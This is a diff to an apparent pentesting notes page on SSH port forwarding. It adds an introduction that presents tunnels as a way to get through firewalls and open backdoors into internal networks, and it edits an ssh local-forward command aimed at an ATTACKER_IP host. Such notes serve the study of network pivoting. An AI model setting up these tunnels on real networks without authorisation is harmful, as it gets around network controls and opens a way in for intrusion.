@@ -1,11 +1,16 @@
 ---
 title: Port Forwarding
-hide_title: True
 ---
 
 import Tabs from '@theme/Tabs';
 import TabItem from '@theme/TabItem';
 
+**`Port Forwarding`** is a mechanism for **Tunneling Application Ports** from the **Client Machine** to the **Server Machine**, or vice versa. It can be used for adding encryption to legacy applications, going through **Firewalls**. 
+
+System Administrators use it for opening Backdoors into the Internal Network from their Home Machines. 
+
+
+<br/>
 
 ### SSH Remote Port Forwarding
 
@@ -39,7 +44,7 @@ This way, any Host that can't connect directly to the **Attacker PC** but can co
 
 ```batch
 :: -L [Request Local Port Forward]
-ssh tunneluser@ATTACKER_IP -L "*:80:127.0.0.1:80" -N
+ssh tunneluser@ATTACKER_IP -L 7000:127.0.0.1:7000 -N
 ```
 
 ```batch
